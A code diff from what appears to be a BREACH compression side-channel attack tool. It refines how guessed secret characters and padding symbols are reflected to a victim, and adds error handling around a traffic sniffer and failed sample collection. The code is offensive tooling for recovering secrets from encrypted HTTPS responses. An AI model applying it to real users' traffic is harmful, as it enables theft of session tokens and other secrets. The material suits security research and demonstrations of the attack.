@@ -6,6 +6,7 @@ from breach.models import SampleSet, Round
 from breach.sniffer import Sniffer
 
 import string
+import requests
 import logging
 
 
@@ -66,28 +67,33 @@ class Strategy(object):
         # We use '^' as a separator symbol and we assume it is not part of the
         # secret. We also assume it will not be in the content.
 
+        # Added symbols are the total amount of dummy symbols that need to be added,
+        # either in candidate alphabet or huffman complement set in order
+        # to avoid huffman tree imbalance between samplesets of the same batch.
+        added_symbols = self._round.maxroundcardinality - self._round.minroundcardinality
+
         sentinel = '^'
 
         assert(sentinel not in self._round.knownalphabet)
-        alphabet_complement = list(set(string.punctuation + string.ascii_letters + string.digits) - set(self._round.knownalphabet))
-
-        huffman_complement = set(self._round.knownalphabet) - set(sampleset.candidatealphabet)
+        knownalphabet_complement = list(set(string.ascii_letters + string.digits) - set(self._round.knownalphabet))
 
         candidate_secrets = set()
-
         for letter in sampleset.candidatealphabet:
             candidate_secret = self._round.knownsecret + letter
             candidate_secrets.add(candidate_secret)
 
-        # Add as many dummy symbols as necessary, so that all different candidate
-        # alphabets have the same amount of total data.
-        candidate_balance = self._round.roundcardinality - len(candidate_secrets)
-        assert(len(alphabet_complement) > candidate_balance)
-        candidate_balance = [self._round.knownsecret + c for c in alphabet_complement[0:candidate_balance]]
+        # Candidate balance indicates the amount of dummy symbols that will be included with the
+        # candidate alphabet's part of the reflection.
+        candidate_balance = self._round.maxroundcardinality - len(candidate_secrets)
+        assert(len(knownalphabet_complement) > candidate_balance)
+        candidate_balance = [self._round.knownsecret + c for c in knownalphabet_complement[0:candidate_balance]]
 
-        huffman_balance = self._round.roundcardinality - len(huffman_complement)
-        assert(len(alphabet_complement) > huffman_balance)
-        huffman_balance = alphabet_complement[0:huffman_balance]
+        # Huffman complement indicates the knownalphabet symbols that are not currently being tested
+        huffman_complement = set(self._round.knownalphabet) - set(sampleset.candidatealphabet)
+
+        huffman_balance = added_symbols - len(candidate_balance)
+        assert(len(knownalphabet_complement) > len(candidate_balance) + huffman_balance)
+        huffman_balance = knownalphabet_complement[len(candidate_balance):huffman_balance]
 
         reflected_data = [
             '',
@@ -112,7 +118,29 @@ class Strategy(object):
 
         Pre-condition: There is already work to do.'''
 
-        self._sniffer.start(self._victim.sourceip, self._victim.target.host)
+        try:
+            self._sniffer.start(self._victim.sourceip, self._victim.target.host)
+        except (requests.HTTPError, requests.exceptions.ConnectionError), err:
+            if isinstance(err, requests.HTTPError):
+                status_code = err.response.status_code
+                logger.warning('Caught {} while trying to start sniffer.'.format(status_code))
+
+                # If status was raised due to conflict,
+                # delete already existing sniffer.
+                if status_code == 409:
+                    try:
+                        self._sniffer.delete(self._victim.sourceip, self._victim.target.host)
+                    except (requests.HTTPError, requests.exceptions.ConnectionError), err:
+                        logger.warning('Caught error when trying to delete sniffer: {}'.format(err))
+
+            elif isinstance(err, requests.exceptions.ConnectionError):
+                logger.warning('Caught ConnectionError')
+
+            # An error occurred, so if there is a started sampleset mark it as failed
+            if SampleSet.objects.filter(round=self._round, completed=None).exclude(started=None):
+                self._mark_current_work_completed()
+
+            return {}
 
         unstarted_samplesets = self._get_unstarted_samplesets()
 
@@ -137,21 +165,32 @@ class Strategy(object):
 
         return sampleset
 
-    def _mark_current_work_completed(self, capture):
+    def _mark_current_work_completed(self, capture=None):
         sampleset = self._get_current_sampleset()
         sampleset.completed = timezone.now()
-        sampleset.data = capture
-        sampleset.success = True
+
+        if capture:
+            sampleset.success = True
+            sampleset.data = capture
+        else:
+            # Sampleset data collection failed,
+            # create a new sampleset for the same attack element
+            s = SampleSet(
+                round=sampleset.round,
+                candidatealphabet=sampleset.candidatealphabet
+            )
+            s.save()
+
         sampleset.save()
 
     def _collect_capture(self):
         captured_data = self._sniffer.read(self._victim.sourceip, self._victim.target.host)
-        return captured_data
+        return captured_data['capture']
 
     def _analyze_current_round(self):
         '''Analyzes the current round samplesets to extract a decision.'''
 
-        current_round_samplesets = SampleSet.objects.filter(round=self._round)
+        current_round_samplesets = SampleSet.objects.filter(round=self._round, success=True)
         self._decision = decide_next_world_state(current_round_samplesets)
 
         logger.debug('Decision: {}'.format(self._decision))
@@ -182,7 +221,8 @@ class Strategy(object):
         next_round = Round(
             victim=self._victim,
             index=self._round.index + 1 if hasattr(self, '_round') else 1,
-            roundcardinality=max(map(len, candidate_alphabets)),
+            maxroundcardinality=max(map(len, candidate_alphabets)),
+            minroundcardinality=min(map(len, candidate_alphabets)),
             amount=SAMPLES_PER_SAMPLESET,
             knownalphabet=state['knownalphabet'],
             knownsecret=state['knownsecret']
@@ -209,7 +249,7 @@ class Strategy(object):
     def _attack_is_completed(self):
         return len(self._round.knownsecret) == self._victim.target.secretlength
 
-    def work_completed(self):
+    def work_completed(self, success=True):
         '''Receives and consumes work completed from the victim, analyzes
         the work, and returns True if the attack is complete (victory),
         otherwise returns False if more work is needed.
@@ -218,12 +258,42 @@ class Strategy(object):
 
         Post-condition: Either the attack is completed, or there is work to
         do (there are unstarted samplesets in the database).'''
+        try:
+            if success:
+                # Call sniffer to get captured data
+                capture = self._collect_capture()
+                logger.debug('Collected capture with length: {}'.format(len(capture)))
+            else:
+                logger.debug('Client returned fail to realtime')
+                assert success
 
-        # Call sniffer to get captured data
-        capture = self._collect_capture()
+            # Stop data collection and delete sniffer
+            self._sniffer.delete(self._victim.sourceip, self._victim.target.host)
+        except (requests.HTTPError, requests.exceptions.ConnectionError, AssertionError), err:
+            if isinstance(err, requests.HTTPError):
+                status_code = err.response.status_code
+                logger.warning('Caught {} while trying to collect capture and delete sniffer.'.format(status_code))
 
-        # Stop data collection and delete sniffer
-        self._sniffer.delete(self._victim.sourceip, self._victim.target.host)
+                # If status was raised due to malformed capture,
+                # delete sniffer to avoid conflict.
+                if status_code == 422:
+                    try:
+                        self._sniffer.delete(self._victim.sourceip, self._victim.target.host)
+                    except (requests.HTTPError, requests.exceptions.ConnectionError), err:
+                        logger.warning('Caught error when trying to delete sniffer: {}'.format(err))
+
+            elif isinstance(err, requests.exceptions.ConnectionError):
+                logger.warning('Caught ConnectionError')
+
+            elif isinstance(err, AssertionError):
+                logger.warning('Realtime reported unsuccessful capture')
+                try:
+                    self._sniffer.delete(self._victim.sourceip, self._victim.target.host)
+                except (requests.HTTPError, requests.exceptions.ConnectionError), err:
+                    logger.warning('Caught error when trying to delete sniffer: {}'.format(err))
+
+            self._mark_current_work_completed()
+            return False
 
         self._mark_current_work_completed(capture)
 
